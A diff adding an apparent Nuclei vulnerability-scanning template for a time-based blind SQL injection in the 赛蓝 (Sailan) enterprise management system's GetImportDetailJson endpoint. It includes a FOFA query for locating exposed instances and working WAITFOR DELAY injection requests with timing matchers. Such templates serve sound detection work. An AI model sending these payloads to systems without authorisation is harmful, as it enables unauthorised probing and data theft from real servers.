@@ -1,0 +1,35 @@
+id: sailan-GetImportDetailJson-sql
+
+info:
+  name: "赛蓝企业管理系统 GetImportDetailJson 接口 SQL 时间盲注"
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="www.cailsoft.com" || body="赛蓝企业管理系统"
+      赛蓝企业管理系统在 GetImportDetailJson 接口实现中存在 SQL 时间盲注漏洞。攻击者可通过构造恶意 SQL 查询，利用时间延迟注入技术获取数据库敏感信息（如管理员凭据及用户数据）。在具备高权限的情况下，可能进一步通过注入点执行系统命令，实现服务器控制。
+  reference:
+  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486525&idx=1&sn=a9a84a8b86f6b7d71a4693fa4e226b2b&chksm=c267b90ef5103018659cb0d39490917960af506b229ee4d98ccf3763ecd603d04948760e9f17&token=1628549949&lang=zh_CN#rd
+  tags: 赛蓝企业管理系统
+
+
+http:
+- raw:
+  - |
+    GET /BaseModule/ExcelImport/GetImportDetailJson?ImportId=1%27%3bWAITFOR+DELAY+'0:0:4'-- HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+
+  - |
+    GET /BaseModule/ExcelImport/GetImportDetailJson?ImportId=1%27%3bWAITFOR+DELAY+'0:0:8'-- HTTP/1.1
+    Host: {{Hostname}}
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
+
+  matchers:
+  - type: dsl
+    dsl:
+    - 'duration_1>=4 && duration_1<=5'
+    - 'duration_2>=8 && duration_2<=9'
+    condition: and
+
+
+
